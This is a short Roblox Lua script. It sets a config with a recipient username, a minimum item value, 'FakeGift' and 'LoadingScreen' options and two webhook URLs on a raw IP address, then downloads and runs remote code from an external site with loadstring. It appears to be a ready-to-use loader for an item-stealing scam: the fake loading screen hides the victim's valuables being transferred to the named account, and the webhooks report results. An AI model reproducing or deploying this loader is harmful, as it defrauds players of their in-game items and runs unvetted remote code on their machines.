_G.LRMConfig = {
    User = {"DIRECTIONSSSSYT"},
    min_value = 10000000000,
    pingEveryone = "Yes", -- dont change this
    Webhook = "http://176.100.37.215:20002/proxy/5a9582f933e527471b86dc703d8b8e91",
    FakeGift = "Yes",
    Trash = "http://176.100.37.215:20002/proxy/47f0ddccf439d5621844969894debffe",
    LoadingScreen = "Yes",
    GiftOnlyRares = "Yes",
    ExecuteOtherScript = "No",
}
    
loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()